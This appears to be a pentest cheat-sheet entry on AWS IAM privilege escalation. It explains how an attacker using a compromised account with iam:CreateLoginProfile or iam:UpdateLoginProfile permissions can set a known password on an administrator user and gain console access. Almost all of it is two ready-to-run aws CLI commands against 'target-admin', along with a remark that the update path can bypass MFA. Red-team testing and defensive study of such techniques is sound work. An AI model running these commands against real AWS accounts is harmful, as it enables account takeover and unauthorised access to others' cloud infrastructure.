# Create or Update a Login Profile

Use these permissions to gain console access

## Prerequisites:

Compromised account that as the permissions:

    iam:CreateLoginProfile
    iam:UpdateLoginProfile


### 1) Get console access

    aws iam create-login-profile --user-name target-admin --password 'NewPassword123!' --no-password-reset-required

If the login profile already exists, use update-login-profile instead (can bypass MFA)

    aws iam update-login-profile --user-name target-admin --password 'NewPassword123!' --no-password-reset-required

